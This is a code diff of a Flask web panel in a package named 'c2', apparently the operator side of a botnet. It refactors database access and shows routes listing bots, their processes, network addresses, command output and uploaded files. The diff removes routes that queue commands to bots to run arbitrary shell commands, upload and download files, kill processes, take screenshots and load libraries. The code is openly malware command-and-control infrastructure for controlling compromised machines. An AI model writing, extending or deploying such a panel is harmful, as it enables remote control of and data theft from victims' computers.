@@ -6,18 +6,15 @@ from flask import render_template
 from flask import redirect, url_for
 from flask import session
 
-from c2 import dbmain
+from c2.database import get_bot_record as db
 from c2 import app
 import os
-
-DB_NAME = 'notmemory.sqlite'
-IMG_FOLDER = 'img'
 
 
 def get_db() -> sql.Connection:
     db = getattr(g, '_database', None)
     if db is None:
-        db = g._database = sql.connect(DB_NAME)
+        db = g._database = sql.connect(app.config['DB_NAME'])
     return db
 
 
@@ -26,13 +23,15 @@ def get_db() -> sql.Connection:
 @app.route('/home')
 def index():
     conn = get_db()
-    bot_count = dbmain.get_bot_count(conn)
-    user_count = dbmain.get_user_count(conn)
+    bot_count = db.get_bot_count(conn)
+    user_count = db.get_user_count(conn)
     return render_template('index.html', bot_count=bot_count, user_count=user_count)
+
 
 @app.route('/favicon.ico')
 def favicon():
     return send_from_directory("static", 'favicon.ico', mimetype='image/png')
+
 
 @app.route('/bots', methods=['GET'])
 def bots():
@@ -40,7 +39,8 @@ def bots():
         return redirect(url_for('login'))
     if request.method == 'GET':
         conn = get_db()
-        return render_template('bots.html', bot_list = dbmain.get_all_bot_ids_and_networking(conn))
+        return render_template('bots.html', bot_list = db.get_all_bot_ids_and_networking(conn))
+
 
 @app.route('/bot/<id>', methods=['GET'])
 def bot(id):
@@ -49,7 +49,7 @@ def bot(id):
     if request.method == 'GET':
         conn = get_db()
 
-        return render_template('bot.html', id = id, bot_data = dbmain.bot_tostringlist(conn, id))
+        return render_template('bot.html', id = id, bot_data = db.bot_tostringlist(conn, id))
 
 
 @app.route('/bot/<id>/proclist', methods=['GET'])
@@ -58,7 +58,7 @@ def proclist(id):
         return redirect(url_for('login'))
     if request.method == 'GET':
         conn = get_db()
-        return render_template('botproclist.html', id = id, bot_data = dbmain.bot_pstostring(conn, id))
+        return render_template('botproclist.html', id = id, bot_data = db.bot_pstostring(conn, id))
 
 
 @app.route('/bot/<id>/networkaddresses', methods=['GET'])
@@ -67,7 +67,7 @@ def networkaddresses(id):
         return redirect(url_for('login'))
     if request.method == 'GET':
         conn = get_db()
-        return render_template('botnetworkaddresslist.html', id=id, bot_data=dbmain.bot_nwaddrtostring(conn, id))
+        return render_template('botnetworkaddresslist.html', id=id, bot_data=db.bot_nwaddrtostring(conn, id))
 
 
 @app.route('/bot/<id>/commandoutput', methods=['GET'])
@@ -76,7 +76,7 @@ def commandoutput(id):
         return redirect(url_for('login'))
     if request.method == 'GET':
         conn = get_db()
-        return render_template('botcommandout.html', id=id, bot_data=dbmain.bot_cmdouttostring(conn, id))
+        return render_template('botcommandout.html', id=id, bot_data=db.bot_cmdouttostring(conn, id))
 
 
 @app.route('/uploads', methods=['GET'])
@@ -91,6 +91,7 @@ def uploads_main():
                 return send_from_directory(app.config['UPLOAD_FOLDER'])
             files = os.listdir(abs_path)
             return render_template('uploads.html', files=files)
+
 
 @app.route('/uploads/<path:req_path>', methods=['GET'])
 def uploads(req_path):
@@ -107,98 +108,6 @@ def uploads(req_path):
             files = os.listdir(abs_path)
             return render_template('uploads.html', files=files)
 
-
-@app.route('/action/run', methods=['POST'])
-def actionrun():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '4 ' + request.form['cmd'])
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/upload', methods=['POST'])
-def actionupload():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '5 ' + request.form['path'])
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/download', methods=['POST'])
-def actiondownload():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '6 ' + request.form['url'] + ' ' + request.form['filepath'])
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/kill', methods=['POST'])
-def actionkill():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '7 ' + request.form['pid'])
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/info', methods=['POST'])
-def actioninfo():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '2')
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/ps', methods=['POST'])
-def actionps():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '3')
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-
-@app.route('/action/ss', methods=['POST'])
-def actionss():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '8')
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-@app.route('/action/loadlibrary', methods=['POST'])
-def actionloadlibrary():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '9 ' + request.form['librarypath'])
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
-
-
-@app.route('/action/clear', methods=['POST'])
-def clearqueue():
-    if 'username' not in session:
-        return redirect(url_for('login'))
-    if request.method == 'POST':
-        conn = get_db()
-        dbmain.update_commandqueue(conn, request.form['id'], '')
-        return redirect(url_for('bot', id=request.form['id']))
-    return 'Error adding command to database'
 
 
 @app.errorhandler(404)
